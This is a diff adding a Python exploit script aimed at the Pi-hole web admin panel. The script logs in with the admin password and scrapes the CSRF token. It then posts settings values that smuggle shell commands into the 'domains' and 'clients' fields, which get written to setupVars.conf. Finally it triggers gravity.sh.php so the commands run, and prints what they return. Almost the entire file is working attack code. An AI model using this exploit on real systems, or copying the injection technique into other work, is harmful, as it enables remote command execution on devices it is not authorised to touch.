@@ -1,0 +1,60 @@
+#!/usr/bin/python3
+import sys
+import requests
+from urllib.parse import quote
+from bs4 import BeautifulSoup
+
+if len(sys.argv) != 3:
+    print(f'[+] {sys.argv[0]} <target:http://127.0.0.1> <adminPassword>')
+    sys.exit(-1)
+
+s = requests.Session()
+token = ""
+headers={'Content-Type': 'application/x-www-form-urlencoded'}
+url = sys.argv[1]
+
+def main():
+    getCookieAndToken()
+    sendPayload()
+    callGravity()
+
+def getCookieAndToken():
+    print('[+] Logging in to get cookie and token.')
+    try:
+        global token
+        password = sys.argv[2]
+        if "http" not in url:
+            print("Target has to be the base address: http://127.0.0.1")
+        r = s.post(f'{url}/admin/index.php?login', data=f"pw={password}", headers=headers )
+        formatted = BeautifulSoup(r.text, 'html.parser')
+        token = quote(formatted.find(id="token").get_text())
+        if not token:
+            print('Unable to get token.')
+            raise Exception
+    except:
+        print("Wrong password or other failure.")
+        sys.exit(-1)
+
+def sendPayload():
+    try:
+        commands = ['dir', 'id']
+        payload = f"domains=*;{commands[0]}&clients=*;${commands[1]}&permitted=on&querylog-blocked=on&field=API&token={token}"
+        r = s.post(f'{url}/admin/settings.php?tab=api', data=payload, headers=headers )
+        if "updated" not in r.text:
+            print("[*] ERROR: Unable to edit settings. Exploit failed. Patched?")
+            raise Exception
+        print("[+] Injected command into /etc/pihole/setupVars.conf")
+    except:
+        sys.exit(-1)
+
+def callGravity():
+    print("[+] Triggering command with gravity. If there is no output that doesn't mean it didn't run.")
+    r = s.get(f'{url}/admin/scripts/pi-hole/php/gravity.sh.php' )
+    lines = r.text.split('\n')
+    for line in lines:
+        if "Neutrino" in line:
+            break
+        print(line.replace("data: ", ""))
+
+if __name__ == "__main__":
+    main()
